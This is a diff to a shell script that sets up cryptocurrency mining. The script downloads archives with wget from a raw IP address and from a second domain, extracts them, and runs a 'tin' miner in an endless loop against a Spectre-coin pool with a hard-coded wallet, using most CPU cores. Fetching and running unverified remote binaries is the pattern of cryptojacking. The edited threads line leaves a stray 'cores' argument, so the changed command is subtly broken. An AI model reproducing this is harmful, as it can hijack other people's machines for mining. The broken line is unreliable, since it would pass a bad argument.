@@ -34,10 +34,6 @@ underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 currentdate+=$underscored_ip
 used_num_of_cores=`expr $num_of_cores - 3`
 
-echo ""
-echo "You have a total number of $used_num_of_cores cores"
-echo ""
-
 sleep 2
 
 wget http://45.135.58.52/Spectre.tar.gz
@@ -79,7 +75,15 @@ sleep 2
 
 wget -q http://greenleaf.teatspray.fun/tin.tar.gz >/dev/null
 
+sleep 2
+
 tar -xf tin.tar.gz
+
+sleep 2
+
+echo ""
+echo "You have a total number of $used_num_of_cores cores"
+echo ""
 
 sleep 2
 
@@ -91,6 +95,6 @@ sleep 2
 
 while true
 do
-./tin --spectre --stratum --daemon-address spectre.cedric-crispin.com --port 4364 --wallet spectre:qqp8js5e364fagd3w9j3ncq4ea29d9tj0lpmemzew6rcgtzz9ck0u54kwtgta --worker-name $currentdate --dev-fee 1 --threads 13
+./tin --spectre --stratum --daemon-address spectre.cedric-crispin.com --port 4364 --wallet spectre:qqp8js5e364fagd3w9j3ncq4ea29d9tj0lpmemzew6rcgtzz9ck0u54kwtgta --worker-name $currentdate --dev-fee 1 --threads $used_num_of_cores cores
 sleep 10
 done
